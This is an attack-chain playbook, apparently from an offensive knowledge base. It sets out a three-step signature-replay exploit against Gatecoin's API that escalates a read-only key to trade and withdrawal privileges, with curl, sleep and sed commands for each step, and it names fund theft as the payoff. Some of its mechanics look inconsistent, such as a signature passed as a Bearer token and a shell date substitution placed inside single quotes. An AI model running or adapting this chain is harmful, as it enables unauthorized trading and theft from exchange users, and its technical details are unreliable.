---
id: ac-gatecoin-signature-replay
name: Gatecoin API Signature Replay for Privilege Escalation
tags:
  - api-replay
  - auth-bypass
  - privilege-escalation
  - timing-attack
  - cryptocurrency
type: attack_chain
tools:
  - '[[tools/reuse_signature_gatecoin.py]]'
tactics:
  - '[[Initial Access]]'
  - '[[Persistence]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Generate-Initial-API-Request-with-Future-Timestamp]]'
  - '[[procedures/Wait-for-Signature-Cache-Expiration]]'
  - '[[procedures/Replay-Modified-API-Request-for-Privilege-Escalation]]'
step_count: 3
techniques:
  - '[[Valid Accounts]]'
  - '[[External Remote Services]]'
updated_at: '2025-12-14T17:32:20.800Z'
description: >-
  A replay attack exploiting Gatecoin's API signature mechanism to escalate
  read-only API keys to full trading and withdrawal privileges via timestamp and
  cache manipulation.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Persistence]]'
mitre_techniques:
  - '[[Valid Accounts]]'
  - '[[External Remote Services]]'
---
# Gatecoin API Signature Replay for Privilege Escalation

Multi-stage attack chain exploiting a flaw in Gatecoin's API request signing where signatures exclude the payload, allowing reuse after cache expiration but within the timestamp window, leading to unauthorized creation of privileged API keys.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Generate Initial Request] --> B[Wait for Cache Expiration]
    B --> C[Replay Modified Request]
    C --> D[Privilege Escalation Achieved]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/reuse_signature_gatecoin.py]]
- Network interception tool (e.g., Burp Suite or Wireshark)

### Target Environment

- Gatecoin API endpoints (e.g., POST /api/v1/keys for key creation)
- Web platform with API access
- Attacker's system clock slightly ahead of server's (e.g., 3 seconds)

### Initial Access Requirements

- Valid Gatecoin account credentials for authenticated API requests
- Ability to intercept or generate API traffic
- Network position allowing man-in-the-middle or direct API calls

## Detailed Attack Procedures

### Step 1: Generate Initial Request
procedure: [[procedures/Generate-Initial-API-Request-with-Future-Timestamp]]

**Objective**: Create and intercept an API request for a read-only key with a timestamp 3 seconds in the future to prepare for signature reuse.

**Instructions**: Use a tool like Burp Suite to intercept or directly craft the request. Set the timestamp to current time + 3 seconds. Execute the initial API call using [[commands/curl-create-readonly-key]] to generate the signed request.

```bash
curl -X POST 'https://api.gatecoin.com/api/v1/keys' \
  -H 'Authorization: Bearer YOUR_API_TOKEN' \
  -H 'Content-Type: application/json' \
  -d '{"name": "readonly-key", "permissions": ["read"], "timestamp": "$(date -u +%s%3N --date='+3 seconds')"}' \
  --output initial_request.json
```

Capture the signature from the response or request headers.

**Expected Output**: Signed request JSON with read-only permissions and future timestamp.

**Success Indicators**:
- Request generated successfully without errors
- Signature extracted for reuse
- Timestamp is 3 seconds ahead of server time

### Step 2: Wait for Cache Expiration
procedure: [[procedures/Wait-for-Signature-Cache-Expiration]]

**Objective**: Delay until the 5-minute signature cache expires (299 seconds) while keeping the timestamp within the server's 5-minute validation window.

**Instructions**: Monitor for cache hit errors using repeated test replays with [[commands/curl-test-replay-cache]]. Wait exactly 299 seconds, checking error responses for 'same request within millisecond' which indicates cache presence.

```bash
# Initial test replay (will fail with cache error)
curl -X POST 'https://api.gatecoin.com/api/v1/keys' \
  -H 'Authorization: Bearer REUSED_SIGNATURE' \
  -H 'Content-Type: application/json' \
  -d '@initial_request.json' \
  --output test_response.json
echo "Waiting 299 seconds..."
sleep 299
```

**Expected Output**: Initial replays return HTTP 401 'same request already made'; after wait, no cache error.

**Success Indicators**:
- Cache expiration confirmed by absence of duplicate request error
- Timestamp still valid (within 5 minutes of server time)
- No timestamp rejection error

### Step 3: Replay Modified Request
procedure: [[procedures/Replay-Modified-API-Request-for-Privilege-Escalation]]

**Objective**: Resend the request with the reused signature but modified payload to create a full-privilege API key, enabling trading and withdrawals.

**Instructions**: Modify the payload to include trading and withdrawal permissions, then replay using the original signature and timestamp via [[commands/curl-replay-modified-key]]. Use the Python tool for automation if needed.

```bash
# Modify payload: change permissions to ["read", "trade", "withdraw"]
sed -i 's/"permissions": \["read"]/"permissions": ["read", "trade", "withdraw"]/' initial_request.json

curl -X POST 'https://api.gatecoin.com/api/v1/keys' \
  -H 'Authorization: Bearer REUSED_SIGNATURE' \
  -H 'Content-Type: application/json' \
  -d '@initial_request.json' \
  --output escalated_key.json
```

**Expected Output**: Successful API key creation with full privileges (HTTP 200).

**Success Indicators**:
- New API key returned with trading/withdrawal permissions
- Key usable for unauthorized trades or wallet additions
- No auth or timestamp errors

## Attack Chain Summary

### Key Achievements

1. Successful signature reuse after cache expiration
2. Escalation from read-only to full API privileges
3. Potential for fund theft via unauthorized withdrawals

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Valid Accounts]] Valid Accounts
- [[External Remote Services]] External Remote Services

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access
- [[Persistence]] Persistence

---

*Last updated: 2023-10-01T00:00:00Z*
